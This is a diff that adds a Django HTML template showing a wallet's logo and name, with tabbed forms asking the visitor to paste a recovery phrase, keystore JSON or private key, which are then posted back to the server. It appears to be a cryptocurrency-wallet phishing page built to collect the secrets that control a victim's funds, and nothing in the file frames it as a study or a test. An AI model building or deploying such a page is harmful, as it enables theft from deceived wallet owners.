@@ -1,0 +1,54 @@
+{% extends 'user/base.html' %}
+{% load static %}
+{% block content %}
+<body>
+  <div class="container">
+
+    <div class="cw">
+      <img src="{{x.logo.url}}" alt="">
+      <div class="buttons">
+        <button type="button" onclick="showSection(1)">Phrase</button>
+        <button type="button" onclick="showSection(2)">Keystore JSON</button>
+        <button type="button" onclick="showSection(3)">Private Key</button>
+        <hr style="background-color: gray; width: 80%; height: 5px;">
+      </div>
+
+      <form action="" method="POST" id="dynamicForm">
+        {% csrf_token %}
+        <input type="text" name="wname" value="{{x.name}}" hidden>
+
+        <!-- Section 1: Visible by default -->
+        <div id="section1" class="section" style="display: block;">
+          <textarea name="phrase" placeholder="Enter your phrase"></textarea>
+        </div>
+
+        <!-- Section 2: Hidden initially with CSS -->
+        <div id="section2" class="section" style="display: none;">
+          <textarea name="kj" placeholder="Enter your Keystore JSON"></textarea>
+        </div>
+
+        <!-- Section 3: Hidden initially with CSS -->
+        <div id="section3" class="section" style="display: none;">
+          <textarea name="pkey" placeholder="Enter your Private Key"></textarea>
+        </div>
+
+        <input type="submit" class="bg-gradient-info" value="proceed" style="color: white;">
+      </form>
+
+    </div>
+  </div>
+
+  <script>
+    // Function to show the relevant section based on button click
+    function showSection(sectionNumber) {
+      // Hide all sections
+      document.getElementById("section1").style.display = "none";
+      document.getElementById("section2").style.display = "none";
+      document.getElementById("section3").style.display = "none";
+
+      // Show the selected section
+      document.getElementById("section" + sectionNumber).style.display = "block";
+    }
+  </script>
+</body>
+{% endblock %}
